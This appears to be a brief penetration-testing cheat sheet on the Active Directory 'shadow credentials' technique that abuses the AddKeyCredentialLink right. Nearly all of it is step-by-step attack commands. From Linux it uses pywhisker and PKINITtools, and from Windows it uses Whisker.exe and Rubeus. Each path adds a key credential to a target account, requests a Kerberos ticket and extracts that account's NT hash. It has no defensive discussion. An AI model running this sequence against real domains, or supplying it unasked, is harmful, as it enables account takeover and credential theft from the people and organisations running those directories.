---
title: "AddKeyCredentialLink"
date: 2024-7-31
tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow credentials", "whisker", "pywhisker"]
---

---
### From Linux

[pywhisker](https://github.com/ShutdownRepo/pywhisker)

#### 0. Pre-check (optional)

```bash
python3 pywhisker.py --action list -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps
```

#### 1. Add shadow credentials

```bash
python3 pywhisker.py --action add -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps
```

<br>

```bash
# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
pip3 install -I pyopenssl==24.0.0
```

#### 2. Request TGT using PFX file

[PKINITtools](https://github.com/dirkjanm/PKINITtools)

```bash
sudo ntpdate -s 10.10.11.10 && python3 gettgtpkinit.py -cert-pfx <.pfx> -pfx-pass <pfx_password> example.com/username username.ccache -dc-ip 10.10.11.10
```

#### 3. Import ticket

```bash
export KRB5CCNAME=username.ccache
```

#### 4. Get NT hash

```bash
python3 getnthash.py example.com/username -key <AS-REP_encryption_key>
```

### From Windows

[Whisker.exe](https://github.com/eladshamir/Whisker)

#### 0. Pre-check (optional)

```powershell
.\Whisker.exe list /domain:example.com /target:target_user /dc:dc.example.com
```

#### 1. Add shadow credentials

```powershell
.\Whisker.exe add /domain:example.com /target:target_user /dc:dc.example.com /password:password
```

#### 2. Request TGT using PFX file and get NT hash

```powershell
.\rubeus.exe asktgt /user:target_user /certificate:<BASE64_CERT> /password:password /domain:example.com /dc:dc.example.com /getcredentials /show
```

<br>
